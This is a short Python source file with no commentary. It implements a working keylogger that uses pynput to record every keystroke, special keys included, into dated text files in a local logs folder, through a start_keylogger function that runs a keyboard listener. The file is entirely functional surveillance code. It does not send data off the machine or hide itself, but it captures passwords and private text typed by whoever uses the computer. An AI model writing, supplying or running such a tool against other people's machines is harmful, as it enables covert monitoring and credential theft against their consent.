from pynput import keyboard
import datetime, os

def on_key_press(key):
    try:
        log_filename = f"logs_{datetime.datetime.now().strftime('%Y-%m-%d')}.txt"
        os.makedirs("logs", exist_ok=True)
        log_path = os.path.join("logs", log_filename)

        with open(log_path, 'a', encoding='utf-8') as log_file:
            if hasattr(key, 'char') and key.char:
                log_file.write(key.char)
            elif key == keyboard.Key.space:
                log_file.write(' ')
            elif key == keyboard.Key.enter:
                log_file.write('\n')
            elif key == keyboard.Key.tab:
                log_file.write('[TAB]')
            else:
                log_file.write(f'[{key.name.upper()}]')
    except Exception as e:
        print(f"err{e}")

def start_keylogger():
    listener = keyboard.Listener(on_press=on_key_press, suppress=False)
    listener.start()
    listener.join()
